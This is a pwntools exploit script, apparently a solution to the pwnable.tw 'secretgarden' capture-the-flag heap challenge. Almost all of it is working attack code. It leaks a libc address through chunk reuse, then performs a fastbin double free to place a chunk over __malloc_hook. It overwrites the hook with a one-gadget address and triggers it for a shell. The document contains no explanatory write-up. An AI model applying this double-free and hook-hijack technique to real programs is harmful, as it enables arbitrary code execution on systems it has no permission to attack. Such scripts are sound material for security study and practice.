#encoding=utf-8
from pwn import *

p = process("./secretgarden")
#p = remote("chall.pwnable.tw", 10203)
elf = ELF("./secretgarden")
libc = ELF("./libc_64.so.6")
# libc = elf.libc

context(log_level = 'debug')
DEBUG = 0
if DEBUG:
    gdb.attach(p, 
    ''' 
    b *0x08048935
    c
    ''')

def dbg():
    gdb.attach(p)
    pause()

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
rc      = lambda num                :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delims             :p.recvuntil(delims)
uu32    = lambda data               :u32(data.ljust(4, '\x00')) 
uu64    = lambda data               :u64(data.ljust(8, '\x00'))
info    = lambda tag, addr          :log.info(tag + " -> " + hex(addr))
ia = lambda                    :p.interactive()

menu = "Your choice : "
def cmd(idx):
    ru(menu)
    sl(str(idx))

def add(length, name, color='blue'):
    cmd(1)
    ru("Length of the name :")
    sl(str(length))
    ru("The name of flower :")
    se(name)
    ru("The color of the flower :")
    sl(color)

def show():
    cmd(2)

def remove(idx):
    cmd(3)
    ru("remove from the garden:")
    sl(str(idx))

def clear():
    cmd(4)

add(0x400, "a") #0
add(0x28, "a") #1
add(0x30, "a") #2
#     = = = 0x28 CHUNK, this also the next CHUNK management stack is not split from 0x410
remove(0)
remove(1)
add(0x400, "abcdefgh") #3
show()
ru("flower[3] :abcdefgh")
libc_base = u64(ru("\x7f")[-6:].ljust(8, '\x00')) - 0x68 - libc.symbols['__malloc_hook']
info("libc_base", libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
# og = 0xf0364 + libc_base
og = 0xef6c4 + libc_base

add(0x68, "a") #4
add(0x68, "a") #5
add(0x68, "a") #6

remove(4)
remove(5)
remove(4)

add(0x68, p64(malloc_hook - 0x23))
add(0x68, "a")
add(0x68, "a")
add(0x68, '\x00'*0x13 + p64(og))

remove(7)
remove(7)

p.interactive()
